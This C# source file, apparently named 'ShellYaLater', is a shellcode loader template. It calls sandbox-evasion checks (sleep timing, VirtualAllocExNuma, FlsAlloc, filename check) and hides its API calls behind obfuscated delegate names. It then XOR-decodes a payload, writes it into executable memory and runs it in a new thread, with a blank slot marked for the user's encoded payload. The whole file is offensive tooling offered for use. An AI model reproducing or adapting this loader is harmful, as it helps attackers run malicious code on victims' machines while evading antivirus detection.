using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using ShellYaLater.Evasion_Class;

namespace ShellYaLater
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        private delegate IntPtr J1(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate IntPtr U2(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        private delegate UInt32 ILY(IntPtr hHandle, UInt32 dwMilliseconds);

        private static J1 W1;
        private static U2 RT2;
        private static ILY ER3;

        static void Main(string[] args)
        {
            W1 = VirtualAlloc;
            RT2 = CreateThread;
            ER3 = WaitForSingleObject;
            SherryChristmas.SleepTimer();

            SherryChristmas.VirtualAllocExNuma();

            SherryChristmas.FlsAlloc();

            SherryChristmas.FilenameCheck();

            byte key = 0xAA;  //change your key as needed 

            byte[] buf = new byte[] { };  //put XOR encoded payload here 

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] ^= key;
            }
            int size = buf.Length;

            IntPtr addr = W1(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = RT2(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            ER3(hThread, 0xFFFFFFFF);

        }
    }
}
